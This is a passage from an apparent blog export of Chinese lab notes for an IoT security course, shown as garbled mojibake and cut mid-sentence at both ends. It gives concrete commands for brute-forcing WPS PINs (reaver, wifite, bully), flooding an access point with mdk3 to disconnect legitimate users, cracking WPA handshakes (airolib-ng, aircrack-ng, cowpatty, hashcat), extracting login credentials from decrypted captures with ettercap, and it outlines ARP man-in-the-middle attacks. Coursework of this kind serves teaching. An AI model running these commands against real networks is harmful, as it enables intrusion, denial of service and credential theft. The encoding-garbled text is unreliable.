´è§£ã€‚ è¾“å…¥ç¼–å·1ï¼Œé€‰æ‹©AP ï¼ˆçœ‹è¦æ”»å‡»çš„é‚£ä¸ªç¼–å·æ˜¯ä»€ä¹ˆï¼‰ option use 2 å¯ä»¥é€‰æ‹©2æŠ“WPAæ¡æ‰‹åŒ…ï¼Œé€‰3è¿›è¡ŒWPSæš´åŠ›ç ´è§£PIN 4 è¾“å…¥4 é€‰æ‹©å¿«é€Ÿç ´è§£æ–¹å¼ n ä½¿ç”¨é»˜è®¤è®¾ç½® PINæš´åŠ›ç ´è§£ä¸­","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"å®éªŒ/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"}],"author":"Gryffinbit"},{"title":"ç‰©è”ç½‘æœŸæœ«è€ƒç‚¹","slug":"ç‰©è”ç½‘æœŸæœ«è€ƒç‚¹","date":"2021-06-03T19:40:09.000Z","updated":"2024-11-12T06:59:59.000Z","comments":true,"path":"2021/06/04/ç‰©è”ç½‘æœŸæœ«è€ƒç‚¹/","permalink":"https://gryffinbit.top/2021/06/04/%E7%89%A9%E8%81%94%E7%BD%91%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"å®éªŒéƒ¨åˆ†WIFIå¯†ç ç ´è§£ä¹‹WPSåŠ å¯† å®éªŒåŸç†ï¼šWPSï¼ˆWi-Fi Protected Setupï¼‰æ˜¯ç”±Wi-Fiè”ç›Ÿç»„ç»‡å®æ–½çš„å¯é€‰è®¤è¯é¡¹ç›®ï¼Œä¸»è¦æ˜¯ä¸ºäº†ç®€åŒ–æ— çº¿å±€åŸŸç½‘å®‰å…¨åŠå®‰å…¨æ€§èƒ½çš„é…ç½®å·¥ä½œã€‚ç”¨æˆ·åªéœ€è¦ç®€å•æŒ‰ä¸‹è·¯ç”±å™¨ä¸Šçš„WPSæŒ‰é’®æˆ–è€…è¾“å…¥PINç ï¼Œå³å¯å¿«é€Ÿè¿æ¥åˆ°Wi-Fiç½‘ç»œã€‚â€‹ WPS PINç å…±8ä½ï¼Œå…¶ä¸­ç¬¬8ä½æ˜¯æ ¡éªŒå’Œï¼Œæ‰€ä»¥åªéœ€è®¡ç®—å‡ºå‰7ä½å³å¯ã€‚åœ¨å®æ–½PINç ´è§£æ—¶ï¼Œå¯ä»¥åˆ†åˆ«åˆ¤æ–­PINçš„å‰å››ä½å’Œåä¸‰ä½æ˜¯å¦æ­£ç¡®ã€‚å› æ­¤ï¼ŒPINç åªæœ‰10^4+10^3&#x3D;11000ç§å˜åŒ–ã€‚â€‹ é‚£ä¹ˆåœ¨å®é™…ç ´è§£å°è¯•ä¸­ï¼Œæœ€å¤šåªéœ€è¯•éªŒ11000æ¬¡ï¼Œå¹³å‡åªéœ€è¯•éªŒ5500æ¬¡å°±èƒ½ç ´è§£ã€‚ reaver 1. å¼€å¯æ— çº¿ç½‘å¡çš„ç›‘å¬æ¨¡å¼ airmon-ng start wlan0 2.ä½¿ç”¨washå·¥å…·æ‰«æå¼€å¯WPSçš„AP wash -i wlan0mon BSSID AP çš„MACåœ°å€ Ch APçš„å·¥ä½œä¿¡é“ é€‰é¡¹ è¯´æ˜ dBm æ¥æ”¶çš„ä¿¡å·å¼ºåº¦ WPS WPSçš„ç‰ˆæœ¬ Lck WPSæ˜¯å¦é”å®š Vendor ç”Ÿæˆå‚å•† ESSID APçš„SSID â€‹ æŸ¥çœ‹æœ‰WPSåŠŸèƒ½çš„AP â€‹ airodump-ng --wps wlan0mon 3. ä½¿ç”¨reaverå·¥å…·è¿›è¡Œç ´è§£ Reaveræ˜¯ä¸€æ¬¾æš´åŠ›ç ´è§£PINç çš„å·¥å…·ï¼Œå°†å°è¯•ä¸€ç³»åˆ—çš„PINç ï¼Œç›´åˆ°ç ´è§£å‡ºæ­£ç¡®çš„PINç ï¼Œè€Œä¸”è¿˜å¯ä»¥æ¢å¤å‡ºWPA&#x2F;WPA2å¯†ç ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š reaver -i [interface] -b [apçš„macåœ°å€] å‚æ•°è¯´æ˜ï¼š é€‰é¡¹ è¯´æ˜ -i æŒ‡å®šç›‘å¬çš„æ— çº¿æ¥å£ -b æŒ‡å®šç›®æ ‡APçš„macåœ°å€ -S ä½¿ç”¨æœ€å°çš„DH keyï¼Œå¯ä»¥æé«˜ç ´è§£é€Ÿåº¦ -v ; -vv ; -q æ˜¾ç¤ºéä¸¥é‡è­¦å‘Š ; æ˜¾ç¤ºæ›´å¤šï¼Œ ç›¸å¯¹åº”çš„ ; åªæ˜¾ç¤ºå…³é”®ä¿¡æ¯ -d å³delayæ¯ç©·ä¸¾ä¸€æ¬¡çš„é—²ç½®æ—¶é—´ï¼Œé¢„è®¾ä¸º1ç§’ -c ä¿¡é“å·ç  -p ä½¿ç”¨æŒ‡å®šPINç çš„å››ä½æˆ–å…«ä½å¼€å§‹ç ´è§£ã€‚ â€‹ reaver -i wlan0mon -b 18:D9:8F:66:CD:7C -v -S â€‹ ä½¿ç”¨æŒ‡å®šPINç è¿›è¡Œç ´è§£ï¼Œä»¥â€œNetsec109_2â€ä½œä¸ºæ”»å‡»ç›®æ ‡ â€‹ reaver -i wlan0mon -b 64:09:80:17:ED:2F -p 1234 -vv -S wifiteâ€‹ wifiteæ˜¯ä¸€æ¬¾è‡ªåŠ¨åŒ–WEPã€WPAå’Œ WPSç ´è§£å·¥å…·ã€‚ç”¨äºç ´è§£WPSåŠ å¯†çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1wifite --wps --wps-only --bully é€‰é¡¹ è¯´æ˜ â€“wps ä»…æ˜¾ç¤ºå¯ç”¨WPSåŠŸèƒ½çš„æ— çº¿ç½‘ç»œã€‚ â€“wps-only ä»…å®æ–½WPS PINå’ŒPixie-Dustæ”»å‡»ã€‚ â€“bully ä½¿ç”¨bullyç¨‹åºå®æ–½WPS PINå’ŒPixie-Dustæ”»å‡»ã€‚ â€“ignore-locks å½“APé”å®šåï¼Œç»§ç»­WPS PINæ”»å‡»ã€‚ 1wifite --wps --wps-only --bully --ignore-locks é€‰æ‹©ä¸€ä¸ªæƒ³è¦æ”»å‡»çš„ç¼–å· BullyBullyä¹Ÿæ˜¯ä¸€æ¬¾åˆ©ç”¨è·¯ç”±å™¨çš„WPSæ¼æ´æ¥ç ´è§£WIFIçš„å·¥å…·ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1bully --bssid [APçš„MACåœ°å€] -c [channel] [interface] -vv é€‰é¡¹ è¯´æ˜ interface æŒ‡å®šç›‘å¬çš„æ— çº¿æ¥å£ã€‚ -bï¼Œâ€“bssid æŒ‡å®šç›®æ ‡APçš„MACåœ°å€ã€‚ -cï¼Œâ€“channel æŒ‡å®šç›®æ ‡APå·¥ä½œçš„ä¿¡é“ã€‚ -vv æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚ 1bully --bssid 18:D9:8F:66:CD:7C wlan0mon -c 11 é˜²æ­¢é”PINâ€‹ ç›®å‰ï¼Œå¤§éƒ¨åˆ†è·¯ç”±å™¨éƒ½è‡ªå¸¦é˜²PINåŠŸèƒ½ã€‚å½“ç©·ä¸¾PINç æš´åŠ›ç ´è§£æ—¶ï¼Œè¿ç»­ä½¿ç”¨è¶…è¿‡ç‰¹å®šæ¬¡æ•°çš„PINç åï¼Œè·¯ç”±å™¨ä¼šæš‚æ—¶é”å®šWPSåŠŸèƒ½ä¸€æ®µæ—¶é—´ã€‚è¿™ç§æƒ…å†µï¼Œéœ€è¦è€å¿ƒç­‰å¾…å…¶æ¢å¤WPSåŠŸèƒ½ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨mdk3å‘èµ·æ´ªæ°´æ”»å‡»ï¼Œä½¿å¾—è·¯ç”±å™¨åˆæ³•ç”¨æˆ·æ— æ³•ä½¿ç”¨ç½‘ç»œï¼Œä»è€Œè¿«ä½¿è·¯ç”±å™¨ä¸»äººé‡å¯è·¯ç”±å™¨ï¼Œå³å¯è§£é™¤PINé”ã€‚â€‹ APè®¤è¯æ´ªæ°´æ”»å‡»ï¼Œå°±æ˜¯å‘APå‘é€å¤§é‡è™šå‡çš„è¿æ¥è¯·æ±‚ã€‚å½“å‘é€çš„è¯·æ±‚è¶…è¿‡APæ‰€èƒ½æ‰¿å—çš„èŒƒå›´æ—¶ï¼ŒAPå°±ä¼šè‡ªåŠ¨æ–­å¼€ç°æœ‰è¿æ¥ï¼Œä½¿å¾—åˆæ³•ç”¨æˆ·æ— æ³•ä½¿ç”¨ç½‘ç»œã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1mdk3 &lt;interface&gt; a &lt;test_options&gt; é€‰é¡¹ è¯´æ˜ interface æŒ‡å®šç”¨äºæ”»å‡»çš„ç½‘ç»œæ¥å£ï¼Œéœ€æ˜¯ç›‘å¬æ¨¡å¼çš„æ¥å£ã€‚ a å®æ–½èº«ä»½éªŒè¯æ´ªæ°´æ”»å‡»æ¨¡å¼ã€‚ -a æŒ‡å®šè¦æ”»å‡»çš„ç›®æ ‡APçš„MACåœ°å€ã€‚ 1mdk3 wlan0mon a -a 18:D9:8F:66:CD:7C ä½¿ç”¨airodump-ngç›‘æµ‹ï¼Œå¯ä»¥çœ‹åˆ°ç•Œé¢ä¸‹æ–¹ç¬é—´å‡ºç°äº†å¤§é‡çš„ä¼ªé€ å®¢æˆ·ç«¯ï¼Œä¸”è¿æ¥çš„ç›®æ ‡APå‡ä¸ºâ€18:D9:8F:66:CD:7Câ€ã€‚ 1airodump-ng wlan0mon -c 11 --bssid 18:D9:8F:66:CD:7C WPAæ¡æ‰‹åŒ…ç ´è§£åŸç†â€‹ å®éªŒåŸç†ï¼šWPAå¯†ç å…¶å®å«PSKï¼ˆpre-shared keyï¼‰ï¼Œå®ƒåŠ ä¸Šssidé€šè¿‡ä¸€å®šçš„ç®—æ³•å¯ä»¥å¾—åˆ°PMKï¼ˆpairwise master keyï¼‰: $$ PMK&#x3D;SHA_1(ssid,psk) $$â€‹ PMKçš„é•¿åº¦æ˜¯å®šé•¿çš„ï¼Œéƒ½æ˜¯64å­—èŠ‚ã€‚ç”±äºè®¡ç®—PMKçš„è¿‡ç¨‹å¼€é”€æ¯”è¾ƒå¤§ï¼Œæ˜¯æˆ‘ä»¬ç ´è§£èŠ±è´¹æ—¶é—´é•¿çš„å…³é”®ï¼Œæ‰€ä»¥é‡‡ç”¨ä»¥ç©ºé—´æ¢æ—¶é—´çš„åŸåˆ™æŠŠPMKäº‹å…ˆç”Ÿæˆå¥½ï¼Œè¿™ä¸ªäº‹å…ˆç”Ÿæˆå¥½çš„è¡¨å°±æ˜¯å¸¸è¯´çš„HASHè¡¨ï¼Œè¿™ä¸ªå·¥ä½œå°±æ˜¯ç”¨airlib-ngè¿™ä¸ªå·¥å…·æ¥å®Œæˆã€‚â€‹ ç›®å‰çš„ç ´è§£æ–¹æ³•æ˜¯æˆ‘ä»¬è·å¾—æ¡æ‰‹åŒ…åï¼Œç”¨æˆ‘ä»¬å­—å…¸ä¸­çš„PSK+ssidç”ŸæˆPMKï¼Œç„¶åç»“åˆæ¡æ‰‹åŒ…ä¸­çš„ï¼ˆå®¢æˆ·ç«¯MACï¼ŒAPçš„BSSIDï¼Œ$A_NONCE$ï¼Œ$S_NONCE$ï¼‰è®¡ç®—PTKï¼Œå†åŠ ä¸ŠåŸå§‹çš„æŠ¥æ–‡æ•°æ®ç®—å‡ºMICå¹¶ä¸APå‘é€çš„MICæ¯”è¾ƒï¼Œå¦‚æœä¸€è‡´ï¼Œé‚£ä¹ˆè¯¥PSKå°±æ˜¯å¯†é’¥ã€‚ airolib-ngâ€‹ airolib-ngæ˜¯Aircrack-ngå¥—è£…é‡Œçš„åˆä¸€ä¸ªå·¥å…·ï¼Œç”¨æ¥å­˜å‚¨å’Œå¤„ç†ç½‘ç»œåå’Œå¯†ç è¡¨ã€‚é€šè¿‡è®¡ç®—PMKï¼Œç”¨äºWPA&#x2F;WPA2çš„ç ´è§£ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1airolib &lt;database&gt; &lt;operation&gt; [options] é€‰é¡¹ è¯´æ˜ database è¡¨ç¤ºæ•°æ®åº“æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ã€‚ operation æŒ‡å®šäº†æˆ‘ä»¬è¦å¯¹æ•°æ®åº“è¿›è¡Œçš„æ“ä½œã€‚ â€“import {essid|passwd} {file} å¯¼å…¥å«æœ‰ç½‘ç»œåæˆ–è€…ç§˜é’¥åˆ—è¡¨çš„æ–‡æœ¬æ–‡ä»¶ã€‚æ–‡ä»¶æ¯è¡Œéœ€å«ä¸€ä¸ªç½‘ç»œåæˆ–è€…å¯†ç ï¼Œä»¥æ¢è¡Œç¬¦ç»“æŸï¼ˆè¿™æ ·è¯»å…¥æ—¶å°±ä¼šè¢«å½“åšâ€œenterâ€ï¼‰ã€‚ â€“batch å¼€å§‹è®¡ç®—æ‰€æœ‰ç½‘ç»œåå’Œå¯†ç çš„ç»„åˆã€‚æ­¤å‘½ä»¤éœ€ç”¨åœ¨aircrack-ngç ´è§£ä¹‹å‰ã€‚å½“æ•°æ®åº“æ·»åŠ äº†æ–°çš„SSIDæˆ–è€…å¯†ç æ—¶ï¼Œä¹Ÿè®¸é‡æ–°è®¡ç®—ã€‚ â€“export cowpatty [essid] [file] å¯¼å‡ºä¸ºcowpattyæ–‡ä»¶ã€‚ â€“sql {sql} æ‰§è¡Œæ‰€ç»™çš„SQLè¯­å¥ã€‚ airolib-ng â€“help æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚ 1.åˆ›å»ºåŒ…å«ESSIDçš„æ–‡æ¡£ åˆ›å»ºåŒ…å«ESSIDçš„æ–‡æ¡£ï¼Œæ¯è¡Œå«æœ‰ä¸€ä¸ªESSIDã€‚åˆ›å»ºåç§°ä¸ºgryffinbitï¼ˆåç§°è‡ªå–ï¼‰çš„æ•°æ®åº“ï¼Œå‘æ•°æ®åº“æ’å…¥ESSIDã€‚ 1airolib-ng gryffinbit --import essid /root/ssid.txt 2.åˆ›å»ºåŒ…å«å¯†ç çš„æ–‡æ¡£ï¼Œå¹¶å‘rainbowæ•°æ®åº“æ’å…¥å¯†ç ã€‚ 1airolib-ng gryffinbit --import password /root/password.txt 3.æ‰¹é‡ç”Ÿäº§PMKæ•°æ®ã€‚ 1airolib-ng gryffinbit --batch æŸ¥çœ‹æ•°æ®çš„çŠ¶æ€ 1airolib-ng gryffinbit --stats å¯ä»¥çœ‹åˆ°ï¼Œå½“å‰æ•°æ®åº“ä¸­æœ‰11ä¸ªESSIDå’Œ16ä¸ªå¯†ç ï¼Œå¹¶ä¸”å·²æˆåŠŸå¯¹å…¶è¿›è¡Œäº†è®¡ç®—ã€‚ 4.ä½¿ç”¨aircrack-ngè¿›è¡Œç ´è§£ 1aircrack-ng -r gryffinbit -e helloworld handshake-01.cap é€‰é¡¹ è¯´æ˜ -r æŒ‡å®šPMKæ•°æ®åº“ -e æŒ‡å®šESSID â€‹ ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨Cowpattyå·¥å…·è¿›è¡Œç ´è§£ã€‚Cowpattyæ˜¯ä¸€æ¬¾Linuxä¸‹ç”¨äºç ´è§£WPA-PSKåŠ å¯†çš„å·¥å…·ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1cowpatty [options] é€‰é¡¹ è¯´æ˜ -d Hashè¡¨ -r å«æœ‰æ¡æ‰‹åŒ…çš„capæ–‡ä»¶ -s APçš„ESSID åœ¨ä½¿ç”¨Cowpattyä¹‹å‰ï¼Œéœ€è¦å…ˆæå–ç”¨äºcowpattyè·‘çš„hash è¡¨ã€‚ 1airolib-ng gryffinbit --export cowpatty helloworld R_table ç„¶åå°±å¯ä»¥ä½¿ç”¨Cowpattyå·¥å…·ã€‚ 1cowpatty -s kong -d R_table -r .cap â€‹ ä½¿ç”¨airolib-ngç”ŸæˆPMKæ•°æ®åï¼Œå¯ä»¥å¯¹è¯¥æ•°æ®è¿›è¡Œç®¡ç†ï¼Œæ¯”å¦‚å¯¼å…¥ç¬¬ä¸‰æ–¹æ•°æ®ã€æ ¡éªŒæ•°æ®å’Œæ¸…ç†æ•°æ®ã€‚å¯¼å…¥ssidlist.txt æ–‡ä»¶ä¸­çš„ESSIDåˆ°æ•°æ®åº“ã€‚ 1airolib-ng gryffinbit --import password /root/password.txt å¯¼å…¥pword.txt æ–‡ä»¶ä¸­çš„å¯†ç åˆ°æ•°æ®åº“ã€‚ 1airolib-ng gryffinbit --import essid /root/ssidlist.txt ä½¿ç”¨â€“verifyé€‰é¡¹æ ¡éªŒæ•°æ®ï¼Œä»¥éªŒè¯æ•°æ®åº“çš„çŠ¶æ€æ­£å¸¸ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨â€“cleané€‰é¡¹è¿›è¡Œæ•°æ®æ¸…ç†ã€‚ 1airolib-ng gryffinbit --verify å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œæ’å…¥å•ä¸ªESSIDã€‚æ’å…¥å•ä¸ªå¯†ç ä¹Ÿå¯ç±»ä¼¼æ“ä½œã€‚ 1echo Love | airolib-ng gryffinbit --import essid - hashcatå·¥å…·â€‹ hashcatä¸€æ¬¾å¼ºå¤§çš„å¼€æºå¯†ç æ¢å¤å·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥åˆ©ç”¨CPUæˆ–GPUèµ„æºï¼Œç ´è§£å¤šç§hashç±»å‹çš„å¯†ç ã€‚å½“æ•è·æ¡æ‰‹åŒ…ä»¥åï¼Œå¯ä»¥ä½¿ç”¨è¯¥å·¥å…·å¿«é€Ÿçš„ç ´è§£å‡ºWPAå¯†ç ã€‚ä½¿ç”¨hashcatå·¥å…·ç ´è§£WPAçš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1hashcat -m 2500 [pcap file ] [words] --force é€‰é¡¹ è¯´æ˜ -m æŒ‡å®šä½¿ç”¨çš„hashç±»å‹,ä¸WPAç›¸å…³çš„hashå¦‚ä¸‹å›¾ã€‚ Words æŒ‡å®šè¦ä½¿ç”¨çš„å­—å…¸ã€‚ â€“force å¿½ç•¥è­¦å‘Šä¿¡æ¯ã€‚ hashcat â€“help æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚ 1.ä½¿ç”¨aircrack-ngå°†æ•è·çš„æ¡æ‰‹åŒ…æ–‡ä»¶è½¬æ¢ä¸ºhccapxæ ¼å¼ã€‚ 1aircrack-ng test-01.cap -j hashcattest 2.ä½¿ç”¨hashcatå·¥å…·è¿›è¡Œç ´è§£ã€‚ 1hashcat -m 2500 hashcattest.hccapx /root/password.txt --force å®¢æˆ·ç«¯è¡Œä¸ºåˆ†æ ä½¿ç”¨airdecap-ngæ°¸ä¹…è§£å¯†WPAæ•°æ®åŒ…airdecap-ng -e wlantest -p qwerty123 new-01.cap ç”¨http.request==1è¿›è¡Œè¿‡æ»¤ï¼Œè·å–å®¢æˆ·ç«¯è¯·æ±‚çš„ç½‘ç«™å’Œç½‘é¡µå†…å®¹ã€‚ä»infoåˆ—å¯ä»¥çœ‹åˆ°è¯·æ±‚çš„ç½‘ç«™å†…å®¹ã€‚åç¼€åä¸º.pngã€.jpegçš„æ–‡ä»¶éƒ½ä¸ºå›¾ç‰‡ã€‚å¤åˆ¶è¯·æ±‚çš„ç½‘å€ï¼Œå³å¯æŸ¥çœ‹åˆ°è¯·æ±‚çš„å®Œæ•´å›¾ç‰‡ã€‚ æ¯”å¦‚å¤åˆ¶ä¸Šå›¾ä¸­URIçš„å€¼ï¼Œå¾—åˆ°è¯¦ç»†ç½‘å€http://cam.tju.edu.cn/uploads/image/20210422/20210422072727_84986.jpg åœ¨æµè§ˆå™¨å³å¯æŸ¥çœ‹å›¾ç‰‡å†…å®¹ã€‚ ç”¨http.request.method==POSTå¿«é€Ÿè¿‡æ»¤å‡ºä½¿ç”¨POSTæ–¹å¼æäº¤çš„æ•°æ®åŒ…ï¼Œè·å–å®¢æˆ·ç«¯æäº¤çš„ç™»å½•ä¿¡æ¯ã€‚å¯ä»¥çœ‹åˆ°loginï¼Œusernameï¼Œsubmitç­‰ä¿¡æ¯ã€‚ é€šè¿‡DNSè®°å½•æŸ¥çœ‹å®¢æˆ·ç«¯ä½¿ç”¨çš„ç¨‹åºï¼Œä½¿ç”¨dnsè¿‡æ»¤å™¨ï¼Œå¿«é€Ÿè¿‡æ»¤å‡ºæ‰€æœ‰DNSåè®®åŒ…ã€‚å¯ä»¥çœ‹åˆ°æ‰€æœ‰DNSæŸ¥è¯¢ï¼ˆqueryï¼‰å’Œå“åº”ï¼ˆquery responseï¼‰çš„åŒ…ã€‚é€šè¿‡æŸ¥çœ‹infoåˆ—çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å®¢æˆ·ç«¯è¯·æ±‚è§£æçš„åŸŸåã€‚é€šè¿‡æŸ¥çœ‹å“åº”åŒ…çš„è¯¦ç»†ä¿¡æ¯ï¼Œå³å¯çŸ¥é“æœåŠ¡å™¨çš„IPåœ°å€ã€‚è¿‡æ»¤åå±•ç¤ºäº†åŸŸåä¸ºwsjf.cdut.edu.cnçš„æœåŠ¡å™¨IPåœ°å€ä¸º202.115.140.178ã€‚ å½“ç”¨æˆ·ä½¿ç”¨QQç¨‹åºæ—¶ï¼Œä¼šæ•è·åˆ°å¤§é‡çš„OICQåè®®åŒ…ã€‚å› æ­¤å¯ä»¥é€šè¿‡è¿‡æ»¤å™¨oicqï¼ŒæŸ¥çœ‹å®¢æˆ·ç«¯æ˜¯å¦è¿è¡Œäº†QQç¨‹åºã€‚å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†è®¸å¤šOICQåè®®åŒ…ï¼Œä»åŒ…çš„è¯¦ç»†ä¿¡æ¯å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…è¯·æ±‚çš„å‘½ä»¤ã€åºåˆ—å·ã€QQå·åŠæ˜¯å¦æœ‰æ•°æ®ä¼ è¾“ç­‰ä¿¡æ¯ã€‚ httpryæ˜¯ä¸€æ¬¾HTTPæ•°æ®åŒ…å—…æ¢å·¥å…·ï¼Œå¯ä»¥æå–HTTPã€‚å…ˆä½¿ç”¨å‘½ä»¤apt-get install httpryå®‰è£…ï¼Œå®‰è£…æˆåŠŸåï¼Œå°±å¯ä»¥æå–HTTPè®¿é—®è®°å½•httpry -r new-01-dec.capå¯ä»¥çœ‹åˆ°æå–åˆ°çš„æ‰€æœ‰HTTPè®¿é—®è®°å½•ã€‚è¾“å‡ºä¿¡æ¯åˆ†ä¸º6ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯æ—¶é—´ã€æºåœ°å€ã€ç›®æ ‡åœ°å€ã€è¯·æ±‚æ–¹æ³•ã€ä¸»æœºåå’ŒåŒ…ä¿¡æ¯ã€‚ Ettercapæ˜¯ä¸€æ¬¾åŸºäºARPåœ°å€æ¬ºéª—æ–¹å¼çš„ç½‘ç»œå—…æ¢å·¥å…·ã€‚è¯¥å·¥å…·ä¸ä»…å¯ä»¥åœ¨çº¿ç›‘å¬ç½‘ç»œæ•°æ®åŒ…ï¼Œè¿˜å¯ä»¥ç›´æ¥è¯»å–æ•è·æ–‡ä»¶ä¸­çš„æ•°æ®åŒ…å†…å®¹ï¼Œä»¥æå–ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚ç™»å½•ç”¨æˆ·åå’Œå¯†ç ç­‰ã€‚ å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼šettercap -Tq -r &lt;pcapfile&gt; 1-T:è„±æœºå—…æ¢ã€‚æŒ‡å®šè¯¥é€‰é¡¹åï¼ŒEttercapå·¥å…·å°†ç›‘å¬ä¸€ä¸ªpcapå…¼å®¹æ–‡ä»¶ä¸­å­˜å‚¨çš„ç½‘ç»œæ•°æ®åŒ…ï¼Œè€Œä¸æ˜¯ç›´æ¥ç›‘å¬ç½‘ç»œä¸Šçš„æ•°æ®åŒ…ã€‚-q:å®‰å…¨æ¨¡å¼ï¼Œå³ä¸æ˜¾ç¤ºåŒ…å†…å®¹ã€‚-r &lt;pcapfile&gt;:æŒ‡å®šæ‰“å¼€çš„æ•è·æ–‡ä»¶ã€‚ ä½¿ç”¨ Ettercapå·¥å…·ä» new-01-dec.capä¸­æå–ç™»å½•ä¿¡æ¯ï¼šettercap -Tq -r new-01-dec,cap å¯ä»¥çœ‹åˆ°ç™»å½•ç½‘å€202.115.133.172:80ï¼Œç”¨æˆ·åå’Œå¯†ç ã€‚ ARPä¸­é—´äººæ”»å‡» å®éªŒåŸç†ï¼šMITMï¼Œå…¨ç§°ä¸ºMan In The Middleï¼Œå³ä¸­é—´äººã€‚ARPåœ°å€è§£æåè®®æ˜¯å»ºç«‹åœ¨ç½‘ç»œä¸­å„ä¸ªä¸»æœºäº’ç›¸ä¿¡ä»»çš„åŸºç¡€ä¸Šçš„ï¼Œå®ƒçš„è¯ç”Ÿä½¿å¾—ç½‘ç»œèƒ½å¤Ÿæ›´åŠ é«˜æ•ˆçš„è¿è¡Œï¼Œä½†å…¶æœ¬èº«ä¹Ÿå­˜åœ¨ç¼ºé™·ã€‚ARPåœ°å€è½¬æ¢è¡¨æ˜¯ä¾èµ–äºè®¡ç®—æœºä¸­é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨åŠ¨æ€æ›´æ–°çš„ï¼Œè€Œé«˜é€Ÿç¼“å†²å­˜å‚¨å™¨çš„æ›´æ–°æ˜¯å—åˆ°æ›´æ–°å‘¨æœŸçš„é™åˆ¶çš„ï¼Œåªä¿å­˜æœ€è¿‘ä½¿ç”¨çš„åœ°å€çš„æ˜ å°„å…³ç³»è¡¨é¡¹ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…æœ‰äº†å¯ä¹˜ä¹‹æœºï¼Œå¯ä»¥åœ¨é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨æ›´æ–°è¡¨é¡¹ä¹‹å‰ä¿®æ”¹åœ°å€è½¬æ¢è¡¨ï¼Œå®ç°æ”»å‡»ã€‚ ARPè¯·æ±‚ä¸ºå¹¿æ’­å½¢å¼å‘é€çš„ï¼Œç½‘ç»œä¸Šçš„ä¸»æœºå¯ä»¥è‡ªä¸»å‘é€ ARPåº”ç­”æ¶ˆæ¯ï¼Œå¹¶ä¸”å½“å…¶ä»–ä¸»æœºæ”¶åˆ°åº”ç­”æŠ¥æ–‡æ—¶ä¸ä¼šæ£€æµ‹è¯¥æŠ¥æ–‡çš„çœŸå®æ€§å°±å°†å…¶è®°å½•åœ¨æœ¬åœ°çš„MACåœ°å€è½¬æ¢è¡¨ï¼Œè¿™æ ·æ”»å‡»è€…å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºå‘é€ä¼ªARPåº”ç­”æŠ¥æ–‡ï¼Œä»è€Œç¯¡æ”¹æœ¬åœ°çš„MACåœ°å€è¡¨ã€‚ ARPæ¬ºéª—å¯ä»¥å¯¼è‡´ç›®æ ‡è®¡ç®—æœºä¸ç½‘å…³é€šä¿¡å¤±è´¥ï¼Œæ›´ä¼šå¯¼è‡´é€šä¿¡é‡å®šå‘ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½ä¼šé€šè¿‡æ”»å‡»è€…çš„æœºå™¨ã€‚æ”»å‡»è€…å†å¯¹ç›®æ ‡å’Œç½‘å…³ä¹‹é—´çš„æ•°æ®è¿›è¡Œè½¬å‘ï¼Œåˆ™å¯ä½œä¸ºä¸€ä¸ªâ€œä¸­é—´äººâ€ï¼Œå®ç°ç›‘å¬ç›®æ ‡å´åˆä¸å½±å“ç›®æ ‡æ­£å¸¸ä¸Šç½‘çš„ç›®çš„ã€‚ å…·ä½“çš„ä¸­é—´äººæ”»å‡»ï¼Œå¤§ä½“å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š å¯¹ç›®æ ‡ä¸»æœºè¿›è¡ŒARPæ¬ºéª—ï¼Œå£°ç§°è‡ªå·±æ˜¯ç½‘å…³ã€‚ è½¬å‘ç›®æ ‡çš„NATæ•°æ®åˆ°ç½‘å…³ï¼Œç»´æŒç›®æ ‡çš„å¤–å‡ºæ•°æ®ã€‚ å¯¹ç½‘å…³è¿›è¡ŒARPæ¬ºéª—ï¼Œå£°ç§°è‡ªå·±æ˜¯ç›®æ ‡ä¸»æœºã€‚ è½¬å‘ç½‘å…³çš„NATæ•°æ®åˆ°ç›®æ ‡ä¸»æœºï¼Œç»´æŒç›®æ ‡çš„æ¥æ”¶æ•°æ®ã€‚ ç›‘å¬åŠ«æŒæˆ–è€…ä¿®æ”¹ç›®æ 